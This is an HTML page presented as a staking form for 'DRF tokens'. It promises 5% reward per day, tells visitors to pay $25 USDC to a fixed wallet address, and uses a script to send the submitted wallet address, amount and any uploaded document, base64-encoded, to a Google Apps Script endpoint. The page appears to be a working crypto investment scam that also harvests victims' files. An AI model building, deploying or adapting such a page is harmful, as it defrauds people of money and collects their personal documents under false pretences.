<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Stake DRF Tokens</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f4f6f9;
    }
    h2 {
      color: #333;
    }
    .form-group {
      margin-bottom: 15px;
    }
    input, button {
      padding: 10px;
      width: 100%;
      margin-top: 5px;
      box-sizing: border-box;
    }
    .notice {
      background: #e0f7fa;
      padding: 10px;
      border-left: 4px solid #00acc1;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <h2>Stake Your DRF Tokens</h2>
  <div class="notice">
    Minimum 30-day lock-in. 5% reward per day. Start staking by paying $25 USDC to address:
    <b>0x88253D87990EdD1E647c3B6eD21F57fb061a3040</b>
  </div>

  <form id="stakingForm">
    <div class="form-group">
      <label>Your Wallet Address</label>
      <input type="text" id="walletAddress" required>
    </div>
    <div class="form-group">
      <label>USDC Paid Amount (min $25)</label>
      <input type="number" id="stakeAmount" min="25" required>
    </div>
    <div class="form-group">
      <label>Upload Document (optional)</label>
      <input type="file" id="fileUpload">
    </div>
    <button type="submit">Submit Staking Request</button>
  </form>

  <script>
    document.getElementById('stakingForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const wallet = document.getElementById('walletAddress').value.trim();
      const amount = document.getElementById('stakeAmount').value.trim();
      const fileInput = document.getElementById('fileUpload');
      const file = fileInput.files[0];
      const timestamp = new Date().toLocaleString();

      // Create a local .txt file for user
      const txtContent = `Wallet Address: ${wallet}\nUSDC Amount: ${amount}\nDate: ${timestamp}`;
      const blob = new Blob([txtContent], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `staking_request_${wallet}.txt`;
      a.click();

      // Build payload
      const uploadData = {
        stakingDetails: {
          walletAddress: wallet,
          stakeAmount: amount,
          timestamp: timestamp
        }
      };

      if (file) {
        const reader = new FileReader();
        reader.onload = async function (event) {
          const base64 = event.target.result.split(',')[1];
          uploadData.file = {
            fileName: file.name,
            fileBase64: base64,
            mimeType: file.type
          };
          await sendToServer(uploadData);
        };
        reader.readAsDataURL(file);
      } else {
        await sendToServer(uploadData);
      }
    });

    async function sendToServer(data) {
      try {
        const response = await fetch("https://script.google.com/macros/s/AKfycby9XhmGdvUimYCNDeBUC3SO7_WleuoWS03t-CdGllWvkE4Fyje2MzU-RjHYXwQV9cJJ/exec", {
          method: "POST",
          body: JSON.stringify(data),
          headers: {
            "Content-Type": "application/json"
          }
        });

        const result = await response.text();
        alert("Staking request sent successfully. Admin will be notified.");
      } catch (err) {
        console.error(err);
        alert("Submission failed. Please try again.");
      }
    }
  </script>
</body>
</html>
